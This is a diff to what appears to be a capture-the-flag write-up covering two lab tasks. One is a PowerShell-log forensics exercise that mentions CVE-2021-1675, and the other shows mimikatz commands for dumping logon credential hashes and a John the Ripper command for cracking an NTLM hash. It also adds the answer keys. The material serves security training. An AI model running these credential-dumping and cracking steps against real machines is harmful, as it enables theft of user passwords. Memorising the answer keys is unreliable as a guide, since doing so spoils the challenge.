@@ -1000,27 +1000,66 @@ There is a PNG file in the Pictures folder named flag2. On opening that file, we
 ## PowershELlF Magic
 
 ```markdown
-1. What command was executed as Elf McNealy to add a new user to the machine?
+For this challenge, we have to use PowerShell Logging.
 
-2. What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server?
+We have to use a tool called Full Event Log View to view Event IDs 4103 and 4104.
 
-3. What was the IP address of the remote server? What was the port used for the remote connection?
+After applying the filters provided to us, we can click on the event logs for more details.
 
-4. What was the encryption key used to encrypt the contents of the text file sent to the remote server?
+The logs mention CVE-2021-1675; we can look into that.
 
-5. What application was used to delete the password.txt file?
+Furthermore, to find the timestamp of the deletion of password.txt, we have to update the filters in Advanced search, to include password.txt as a search string for all events.
 
-6. What is the date and timestamp the logs show that password.txt was deleted?
+To get the contents of the password.txt file, we can use the decryptor.ps1 file on Desktop, and enter the required values.
 
-7. What were the contents of the deleted password.txt file?
+Upon running that program, we get the contents.
+```
+
+```markdown
+1. What command was executed as Elf McNealy to add a new user to the machine? - Invoke-Nightmare
+
+2. What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server? - adm1n
+
+3. What was the IP address of the remote server? What was the port used for the remote connection? - 10.10.148.96,4321
+
+4. What was the encryption key used to encrypt the contents of the text file sent to the remote server? - j3pn50vkw21hhurbqmxjlpmo9doiukyb
+
+5. What application was used to delete the password.txt file? - sdelete.exe
+
+6. What is the date and timestamp the logs show that password.txt was deleted? - 11/11/2021 7:29:27 PM
+
+7. What were the contents of the deleted password.txt file? - Mission Control: letitsnowletitsnowletitsnow
 ```
 
 ## Learning from The Grinch
 
+```powershell
+#using sekurlsa module in mimikatz tool
+cd .\Desktop\mimikatz\x64\
+
+.\mimikatz.exe
+#in mimikatz
+
+privilege::debug
+#check privilege
+
+sekurlsa::logonpasswords
+#dump hashes
+#we have to get password hashes of emily
+
+#in our system, we have to use jtr to crack ntlm hash
+echo "8af326aa4850225b75c592d4ce19ccf5" > emilyhash.txt
+
+cd src/john/run
+
+./john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/emilyhash.txt
+#gives us the password
+```
+
 ```markdown
-1. What is the username of the other user on the system?
+1. What is the username of the other user on the system? - emily
 
-2. What is the NTLM hash of this user?
+2. What is the NTLM hash of this user? - 8af326aa4850225b75c592d4ce19ccf5
 
-3. What is the password for this user?
+3. What is the password for this user? - 1234567890
 ```
